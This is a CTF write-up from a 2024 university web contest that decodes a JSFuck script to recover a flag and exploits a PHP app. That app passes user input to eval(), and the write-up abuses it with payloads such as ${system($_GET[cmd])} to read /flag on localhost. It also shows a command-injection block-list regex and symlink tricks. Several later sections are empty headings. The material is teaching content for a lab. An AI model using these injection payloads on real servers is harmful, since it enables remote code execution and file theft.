
2024 NTUT is1ab 新生盃 Web writeup release
===

# Table of Contents

[TOC]

# Finding Toyz
Ref: [Chw41/Individual-CTF-Topic/Finding Toyz](https://github.com/Chw41/Individual-CTF-Topic/tree/main/Finding%20Toyz)

![image](https://hackmd.io/_uploads/Bygf8J_CA.png)

## Finding Toyz Solution
### 1. Attempt
![image](https://hackmd.io/_uploads/r1PqZl_AC.png)
> <script src="static/secret.js"></script>

static/secret.js
```javascript
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]...
```
![image](https://hackmd.io/_uploads/rkbXMeuRA.png)
> JSFuck 

### 2. JSFuck decode

static/secret.js decode
```javascript=
function enterCell0() {
    document.getElementById("Cell0").style.display = "none";     
    document.getElementById("Cell0001").style.display = "block";     
    document.getElementById("Cell0999").style.display = "block"; }  
function enterCell0001() {     
    document.getElementById("Cell0001").style.display = "none";     
    document.getElementById("Cell0999").style.display = "none";     
    document.getElementById("Cell55688L").style.display = "block";     
    document.getElementById("Cell55688R").style.display = "block"; }  
function enterCell1000() {     
    document.getElementById("Cell0001").style.display = "none";     
    document.getElementById("Cell0999").style.display = "none";     
    document.getElementById("Cell55688L").style.display = "block";     
    document.getElementById("Cell1000").style.display = "block"; }  
function enterCell0999() {     
    document.getElementById("Cell0001").style.display = "none";     
    document.getElementById("Cell0999").style.display = "none";     
    document.getElementById("Cell1001").style.display = "block";     
    document.getElementById("Cell1999").style.display = "block"; } 
function enterCell1001() {     
    document.getElementById("Cell0001").style.display = "none";     
    document.getElementById("Cell0999").style.display = "none";     
    document.getElementById("Cell55688L").style.display = "block";     
    document.getElementById("Cell2000").style.display = "block"; }  
......
function enterCell3450() {     
    document.getElementById("Cell3401").style.display = "none";     
    document.getElementById("Cell3450").style.display = "none";     
    alert(atob("Q29uZ3JhdHVsYXRpb25zISEhCkNIV3tIM3IzX2k1X1QweXpfUHIxNTBOX04wXzM0Njl9"));
    document.getElementById("exit_3450").style.display = "block"; }  
function exit_55688() {     
    document.getElementById("nothing").style.display = "none";     
    document.getElementById("exit_55688").style.display = "none";     
    document.getElementById("Cell55688L").style.display = "block";     
    document.getElementById("Cell55688R").style.display = "block"; }   
function Fakeflag() {     alert("CHW{H3r3_i5_19teahouse__N0T_fl4g}") }
```
>  alert(atob("Q29uZ3JhdHVsYXRpb25zISEhCkNIV3tIM3IzX2k1X1QweXpfUHIxNTBOX04wXzM0Njl9"));

### 3. JavaScript atob function
Base64 decode
```
"Q29uZ3JhdHVsYXRpb25zISEhCkNIV3tIM3IzX2k1X1QweXpfUHIxNTBOX04wXzM0Njl9"
```

## Get FLAG
**FLAG: CHW{H3r3_i5_T0yz_Pr150N_N0_3469}**

# BabyShell
![image](https://hackmd.io/_uploads/HkjFAzu0R.png)

## BabyShell Solution
### 1. Attempt
- click buttom
![image](https://hackmd.io/_uploads/H1730M_A0.png)
> http://localhost:8082/?format=chw

### 2. Code Review
- index.php
```php=
<?php 
date_default_timezone_set('UTC'); #UTC 時區

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});
# 自動載入 /Controller$/* 與 /Model$/* 

$router = new Router();
$router->new('GET', '/', 'TimeController@index');

$response = $router->match();

die($response);
```

- Router.php
```php=37
public function match()
    {
        foreach($this->routes as $route)
        {
            if ($this->_match_route($route['route']))
            {
                if ($route['method'] != $_SERVER['REQUEST_METHOD'])
                {
                    $this->abort(405);
                }
                $params = $this->getRouteParameters($route['route']);

                if (is_array($route['controller']))
                {
                    $controller = $route['controller'];
                    $class      = $controller['class'];
                    $function   = $controller['function'];

                    return (new $class)->$function($this,$params);
                }
                return $route['controller']($this,$params);
            }
        }

        $this->abort(404);
    }

    public function _match_route($route)
    {
        $uri = explode('/', strtok($_SERVER['REQUEST_URI'], '?'));
        $route = explode('/', $route);
        # explode() 將 URL 路徑與路由定義分割成陣列
        if (count($uri) != count($route)) return false;

        foreach ($route as $key => $value)
        {
            if ($uri[$key] != $value && $value != '{param}') return false;
        }

        return true;
    }

    public function getRouteParameters($route) 
    {
        $params = [];
        $uri = explode('/', strtok($_SERVER['REQUEST_URI'], '?'));
        $route = explode('/', $route);
        # getRouteParameters() 解析 URL 中的參數
        foreach ($route as $key => $value)
        {
            if ($uri[$key] == $value) continue;
            if ($value == '{param}')
            {
                if ($uri[$key] == '')
                {
                    $this->abort(404);
                }
                $params[] = $uri[$key];
            }
        }

        return $params;
    }
```
> abort(404)：找不到匹配的路徑\
abort(405)：HTTP method不允許

- controllers/TimeController.php
```php=
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'chw';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
> format 可控\
> 會丟進 TimeModel($format);

- models/TimeModel.php
```php=
<?php
class TimeModel
{
    public function __construct($format)
    {
        # addslashes() 字串中加入反斜線 \\\\
        $this->format = addslashes($format);
        $offset_seconds = 8 * 3600;

        $current_utc_time = gmdate('Y-m-d H:i:s');
        $prediction_time = date('Y-m-d H:i:s', strtotime($current_utc_time) + $offset_seconds);

        $this->prediction = $prediction_time;
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
...
```
> eval() 會生成並執行 date()

### 3. Web Shell
3.1 沒有處理輸入，嘗試 ＄{} 執行 PHP\
http://localhost:8082/?format=${phpinfo()}
![image](https://hackmd.io/_uploads/H19qUQOAR.png)
> 成功 ？！！

3.2 執行 system() Execute Code
http://localhost:8082/?format=${system(ls)}
![image](https://hackmd.io/_uploads/BJOUw7_CC.png)
> Router.php assets controllers index.php models static views

3.3 Find Flag
http://localhost:8082/?format=${system($_GET[cmd])}&cmd=cat%20/fl*
![image](https://hackmd.io/_uploads/H1kucXdA0.png)


## Get FLAG
**FLAG: CHW{7hi5_1s_f4k3_fl4g}**

# cmdi
![image](https://hackmd.io/_uploads/r1Ecs7_0C.png)
> Block List: /[\$;\n`\.&|#]|flag/

## cmdi Solution
### 1. Attempt 
http://localhost:8083/?file=/tmp
![image](https://hackmd.io/_uploads/rkeQ2XdRC.png)
> 隨機 tmp file

```
ln -s /flag /tmp/symlink_to_flag
ln -s /readflag.c /tmp/symlink
```


## Get FLAG

# file_upload
![image](https://hackmd.io/_uploads/BJQMEQnCR.png)

## file_upload Solution
## Get FLAG

# resize image

## resize image Solution
## Get FLAG



